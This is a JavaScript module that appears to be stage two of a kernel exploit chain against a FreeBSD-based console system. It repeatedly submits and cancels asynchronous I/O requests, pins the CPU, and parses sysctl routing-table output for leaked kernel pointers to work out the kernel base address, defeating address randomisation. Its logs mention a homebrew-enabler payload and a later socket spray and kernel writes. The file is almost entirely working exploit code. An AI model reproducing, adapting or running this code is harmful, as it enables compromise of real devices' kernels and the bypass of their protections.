import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";


const T = HX1400_TABLES;
const P = T.P;


const S = {
  getpid: 20,
  getuid: 24,
  read: 3,
  write: 4,
  open: 5,
  close: 6,
  munmap: 73,
  socket: 97,
  setsockopt: 105,
  getsockopt: 118,
  socketpair: 135,
  sysctl: 202,
  kqueue: 362,
  kevent: 363,
  mmap: 477,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  fstat: 189,
  jitshm_create: 533,
  aio_multi_delete: 662,
  aio_multi_wait: 663,
  aio_multi_poll: 664,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
};


const STATE = {
  context: null,
  kbase: 0,
  pinCore: -1,
  savedMask: 0,
};


function context() {
  if (!STATE.context) {
    throw new Error("hx1400: context not installed");
  }

  return STATE.context;
}


function log(tag, detail) {
  context().mark(
    tag,
    detail === undefined ? "" : String(detail),
  );
}


function num(value) {
  if (value instanceof int64) {
    return (
      value.hi * 0x100000000 +
      value.low
    );
  }

  if (
    value !== null &&
    typeof value === "object" &&
    "low" in value
  ) {
    return num(
      new int64(
        value.low,
        "hi" in value ? value.hi : value.high,
      ),
    );
  }

  return Number(value);
}


function h16(value) {
  return (
    "0x" +
    num(value)
      .toString(16)
      .padStart(16, "0")
  );
}


function validateTables() {
  if (!T) {
    throw new Error("HX1400_TABLES missing");
  }

  const lengths = [
    ["P", 31],
    ["PG", 24],
    ["PGL", 24],
    ["PGN", 24],
    ["PGW", 24],
  ];

  for (const pair of lengths) {
    const name = pair[0];
    const expected = pair[1];
    const actual = T[name].length;

    if (actual !== expected) {
      throw new Error(
        name +
        " length " +
        actual +
        " != " +
        expected,
      );
    }
  }

  if (
    !T.PKB ||
    T.PKB.length !== 1264
  ) {
    throw new Error(
      "PKB length is " +
      (T.PKB ? T.PKB.length : 0),
    );
  }
}


function logTables() {
  log(
    "HX1400-TABLES",
    "P=31 PG=24 PGL=24 PGN=24 PGW=24 PKB=1264",
  );

  log(
    "HX1400-P",
    "SE11=" + P[0] +
    " KEXECG=" + P[1] +
    " HEN_SIZE=" + P[2] +
    " HEN_ENTRY=" + P[3],
  );

  log(
    "HX1400-ANCHOR",
    "ANCHOR=" + P[12],
  );
}


function syscallCheck() {
  const c = context();

  const pid = c.sc(
    S.getpid,
  ).i32;

  const uid = c.sc(
    S.getuid,
  ).i32;

  if (pid <= 0) {
    throw new Error(
      "getpid failed: " + pid,
    );
  }

  log(
    "HX1400-SYSCALLS",
    "pid=" + pid + " uid=" + uid,
  );
}


function allocBuffer(size) {
  const c = context();

  const ab = new ArrayBuffer(size);
  const dv = new DataView(ab);
  const u8 = new Uint8Array(ab);

  c.keepAlive.push(
    ab,
    dv,
    u8,
  );

  return {
    ab: ab,
    dv: dv,
    u8: u8,
    addr: c.bufAddr(ab),
  };
}


function putU32(buffer, offset, value) {
  buffer.dv.setUint32(
    offset,
    value >>> 0,
    true,
  );
}


function putI32(buffer, offset, value) {
  buffer.dv.setInt32(
    offset,
    value | 0,
    true,
  );
}


function putU64(buffer, offset, value) {
  const wide = BigInt(num(value));

  buffer.dv.setUint32(
    offset,
    Number(wide & 0xffffffffn),
    true,
  );

  buffer.dv.setUint32(
    offset + 4,
    Number(
      (wide >> 32n) & 0xffffffffn,
    ),
    true,
  );
}


function getU32(buffer, offset) {
  return (
    buffer.dv.getUint32(offset, true) >>> 0
  );
}


function getI32(buffer, offset) {
  return (
    buffer.dv.getInt32(offset, true) | 0
  );
}


function getU64(buffer, offset) {
  return (
    getU32(buffer, offset + 4) *
    0x100000000 +
    getU32(buffer, offset)
  );
}


function pinCpu() {
  const c = context();

  STATE.pinCore = -1;
  STATE.savedMask = 0;

  const mask = allocBuffer(16);
  const id64 = new int64(
    0xffffffff,
    0xffffffff,
  );

  mask.u8.fill(0);

  const getRv = c.sc(
    S.cpuset_getaffinity,
    3,
    1,
    id64,
    16,
    mask.addr,
  ).i32;

  const saved = getU32(mask, 0);
  const cores = [];

  for (let i = 0; i < 32; i++) {
    if (saved & (1 << i)) {
      cores.push(i);
    }
  }

  log(
    "HX1400-PIN-AVAIL",
    "rv=" + getRv +
    " mask=0x" + saved.toString(16) +
    " cores=" + cores.join(","),
  );

  if (getRv !== 0 || cores.length === 0) {
    throw new Error(
      "pin-read-mask failed rv=" +
      getRv +
      " errno=" + c.errno() +
      " cores=" +
      cores.length,
    );
  }

  const core = cores[0];

  mask.u8.fill(0);

  putU32(
    mask,
    0,
    (1 << core) >>> 0,
  );

  const setRv = c.sc(
    S.cpuset_setaffinity,
    3,
    1,
    id64,
    16,
    mask.addr,
  ).i32;

  mask.u8.fill(0);

  c.sc(
    S.cpuset_getaffinity,
    3,
    1,
    id64,
    16,
    mask.addr,
  );

  const back = getU32(mask, 0);

  if (
    setRv !== 0 ||
    back !== ((1 << core) >>> 0)
  ) {
    throw new Error(
      "pin-set failed core=" +
      core +
      " rv=" +
      setRv +
      " back=0x" +
      back.toString(16),
    );
  }

  STATE.pinCore = core;
  STATE.savedMask = saved;

  log(
    "HX1400-PIN",
    "core=" + core +
    " saved=0x" + saved.toString(16),
  );
}


function restorePin() {
  if (STATE.pinCore < 0) {
    return;
  }

  const c = context();

  const mask = allocBuffer(16);
  const id64 = new int64(
    0xffffffff,
    0xffffffff,
  );

  putU32(
    mask,
    0,
    STATE.savedMask >>> 0,
  );

  const rv = c.sc(
    S.cpuset_setaffinity,
    3,
    1,
    id64,
    16,
    mask.addr,
  ).i32;

  log(
    "HX1400-PIN-RESTORED",
    "rv=" + rv +
    " mask=0x" +
    (STATE.savedMask >>> 0).toString(16),
  );

  STATE.pinCore = -1;
}


function makeAioSet() {
  const set = {
    req: allocBuffer(5 * 40),
    submitStatus: allocBuffer(5 * 4),
    cancelStatus: allocBuffer(5 * 4),
    waitStatus: allocBuffer(5 * 4),
    pollStatus: allocBuffer(5 * 4),
    timeout: allocBuffer(8),
    deleteStatus: allocBuffer(5 * 4),
    savedIds: [],
  };

  for (let i = 0; i < 5; i++) {
    putU32(
      set.req,
      i * 40 + 8,
      0,
    );

    putI32(
      set.req,
      i * 40 + 32,
      -1,
    );
  }

  putU64(
    set.timeout,
    0,
    1000,
  );

  return set;
}

function cleanupWashIds(set) {
  const c = context();
  const saved = set.savedIds.length;
  let deleted = 0, failed = 0;
  for (let offset = 0; offset < saved; offset += 5) {
    const count = Math.min(5, saved - offset);
    set.submitStatus.u8.fill(0);
    set.deleteStatus.u8.fill(0);
    for (let i = 0; i < count; i++)
      putU32(set.submitStatus, i * 4, set.savedIds[offset + i]);
    const rv = c.sc(S.aio_multi_delete, set.submitStatus.addr, count,
                    set.deleteStatus.addr).i32;
    if (rv !== 0) { failed += count; continue; }
    for (let i = 0; i < count; i++) {
      if (getU32(set.deleteStatus, i * 4) === 0) deleted++;
      else failed++;
    }
  }
  log("HX1400-AIO-CLEANUP", "saved=" + saved + " deleted=" + deleted + " failed=" + failed);
  set.savedIds.length = 0;
  if (failed) throw new Error("AIO ID cleanup incomplete");
}


function washText(result) {
  if (result.failAt < 0) {
    return (
      "clean stuck=" +
      result.stuck
    );
  }

  let out =
    "op=" +
    result.failOp +
    " at=" +
    result.failAt;

  if (result.rc !== 0) {
    out += " rc=" + result.rc;
  }

  if (result.bad !== 0) {
    out +=
      " res=0x" +
      (result.bad >>> 0).toString(16);
  }

  return out;
}


function wash(set, rounds) {
  const c = context();

  let failAt = -1;
  let failOp = "-";
  let rc = 0;
  let bad = 0;
  let stuck = 0;
  let done = 0;

  for (let iter = 0; iter < rounds; iter++) {
    set.submitStatus.u8.fill(0);

    const submitRv = c.sc(
      S.aio_submit_cmd,
      4097,
      set.req.addr,
      5,
      3,
      set.submitStatus.addr,
    ).i32;

    if (submitRv !== 0) {
      failAt = iter;
      failOp = "submit errno=" + c.errno();
      rc = submitRv;
      break;
    }

    let zeroId = false;

    for (let i = 0; i < 5; i++) {
      const id = getU32(set.submitStatus, i * 4);
      if (id === 0) {
        zeroId = true;
      } else set.savedIds.push(id);
    }

    if (zeroId) {
      failAt = iter;
      failOp = "zero-id";
      break;
    }

    set.waitStatus.u8.fill(0);

    c.sc(
      S.aio_multi_wait,
      set.submitStatus.addr,
      5,
      set.waitStatus.addr,
      0,
      set.timeout.addr,
    );

    let remaining = 0;

    for (let round = 0; round < 4; round++) {
      set.pollStatus.u8.fill(0);

      c.sc(
        S.aio_multi_poll,
        set.submitStatus.addr,
        5,
        set.pollStatus.addr,
      );

      set.cancelStatus.u8.fill(0);

      c.sc(
        S.aio_multi_cancel,
        set.submitStatus.addr,
        5,
        set.cancelStatus.addr,
      );

      remaining = 0;

      for (let i = 0; i < 5; i++) {
        const value = getI32(
          set.cancelStatus,
          i * 4,
        );

        if (value !== 0) {
          remaining++;
          bad = value;
        }
      }

      if (remaining === 0) {
        break;
      }
    }

    if (remaining !== 0) {
      stuck++;
    }

    done = iter + 1;
  }

  return {
    done: done,
    failAt: failAt,
    failOp: failOp,
    rc: rc,
    bad: bad,
    stuck: stuck,
  };
}


let leakCount = 0;

function parseKbase(buffer, length) {
  let offset = 0;
  let hits = 0;
  let base = 0n;
  let conflict = false;

  if (length > buffer.ab.byteLength) {
    length = buffer.ab.byteLength;
  }

  if (!STATE.dumpDone && length >= 16) {
    STATE.dumpDone = true;
    const n = Math.min(length, 192);
    for (let r = 0; r * 16 < n; r++) {
      let hex = "";
      for (let i = r * 16; i < Math.min(r * 16 + 16, n); i++)
        hex += (buffer.u8[i] & 0xff).toString(16).padStart(2, "0");
      log("HX1400-DUMP", "off=0x" + (r * 16).toString(16) + " " + hex);
    }
  }

  while (offset + 16 <= length) {
    const recordLength =
      buffer.dv.getUint16(offset, true);

    if (
      recordLength < 16 ||
      offset + recordLength > length
    ) {
      break;
    }

    if (
      (buffer.u8[offset + 3] & 0xff) === 4 &&
      recordLength >= 40
    ) {
      const low = getU32(
        buffer,
        offset + 32,
      );

      const high = getU32(
        buffer,
        offset + 36,
      );

      if (
        high === 0xffffffff &&
        low !== 0 &&
        low !== 0xffffffff
      ) {
        const qword =
          (BigInt(high >>> 0) << 32n) |
          BigInt(low >>> 0);

        if (leakCount < 8) {
          log(
            "HX1400-LEAK",
            "q" + leakCount + "=0x" +
            qword.toString(16).padStart(16, "0"),
          );
          leakCount++;
        }

        const candidate = qword - BigInt(P[12]);

        if (
          (candidate & 0x3fffn) === 0n &&
          (candidate >> 32n) === 0xffffffffn
        ) {
          if (hits === 0) {
            base = candidate;
          } else if (base !== candidate) {
            conflict = true;
          }

          hits++;
        }
      }
    }

    offset += recordLength;
  }

  if (hits > 0 && !conflict) {
    return base;
  }

  return 0n;
}


async function discoverKbase() {
  const c = context();

  log(
    "HX1400-STAGE2",
    "sysctl+wash+parse start",
  );

  const mib = allocBuffer(32);
    const famArg = c.params && c.params.get ? parseInt(c.params.get("fam") || "", 10) : NaN;
  const mibValues = [
    4,
    17,
    0,
    Number.isFinite(famArg) && famArg >= 0 ? famArg : 28,
    1,
    0,
  ];

  for (let i = 0; i < mibValues.length; i++) {
    putI32(
      mib,
      i * 4,
      mibValues[i],
    );
  }

  const len = allocBuffer(8);
  const out = allocBuffer(32768);

  putU64(
    len,
    0,
    0,
  );

  const routeRv = c.sc(
    S.sysctl,
    mib.addr,
    6,
    0,
    len.addr,
    0,
    0,
  ).i32;

  const routeLen = getU64(
    len,
    0,
  );

  log(
    "HX1400-SYSCTL-ROUTE",
    "fam=" +
    mibValues[3] +
    " rv=" +
    routeRv +
    " len=" +
    routeLen,
  );

  if (routeRv !== 0) {
    const e = (typeof c.errno === "function") ? c.errno() : "n/a";
    throw new Error(
      "route closed rv=" +
      routeRv +
      " errno=" +
      e,
    );
  }

  for (let round = 1; round <= 5; round++) {
    log("HX1400-ROUTE-ROUND", round + "/5");
    pinCpu();

    const aio = makeAioSet();
    let keepWashIds = false;
    try {

    for (
      let segment = 1;
      segment <= 12;
      segment++
    ) {
    log(
      "HX1400-WASH-SEGMENT",
      segment + "/12",
    );

    const result = wash(
      aio,
      32,
    );

    if (
      result.done !== 32 ||
      result.failAt >= 0
    ) {
      const message =
        "wash stalled " +
        washText(result);

      throw new Error(message);
    }

    putU64(
      len,
      0,
      32768,
    );

    const sysctlRv = c.sc(
      S.sysctl,
      mib.addr,
      6,
      out.addr,
      len.addr,
      0,
      0,
    ).i32;

    const used64 = getU64(
      len,
      0,
    );

    const used = Math.min(
      used64,
      out.ab.byteLength,
    );

    const kbase = parseKbase(
      out,
      used,
    );

    log(
      "HX1400-SYSCTL-DATA",
      "seg=" +
      segment +
      " rv=" +
      sysctlRv +
      " used=" +
      used +
      " kbase=" +
      (
        kbase
          ? "0x" + kbase.toString(16).padStart(16, "0")
          : "none"
      ),
    );

      if (kbase) {
        keepWashIds = true;
        return kbase;
      }
    }
    } finally {
      try { if (!keepWashIds) cleanupWashIds(aio); }
      finally { restorePin(); }
    }

    if (round < 5) {
      await new Promise((r) => setTimeout(r, 100));
    }
  }

  return 0n;
}


export async function runHx1400(ctx) {
  STATE.context = ctx;

  try {
    log(
      "HX1400-PORT-START",
      "stage=2-complete-file",
    );

    validateTables();
    logTables();

    syscallCheck();

    log(
      "HX1400-STAGE2",
      "starting kbase discovery",
    );

    const kbase = await discoverKbase();

    if (!kbase) {
      throw new Error(
        "kbase not found",
      );
    }

    STATE.kbase = kbase;
    globalThis.__HX_KBASE = kbase;

    log(
      "HX1400-KBASE",
      "0x" + kbase.toString(16).padStart(16, "0"),
    );

    log(
      "HX1400-MILESTONE2",
      "kbase discovery complete; stopping before socket spray/kernel writes",
    );

    return false;
  } catch (error) {
    log(
      "HX1400-PORT-FAIL",
      error && error.message
        ? error.message
        : String(error),
    );

    try {
      restorePin();
    } catch (restoreError) {
      log(
        "HX1400-PIN-RESTORE-THREW",
        restoreError && restoreError.message
          ? restoreError.message
          : String(restoreError),
      );
    }

    return false;
  }
}
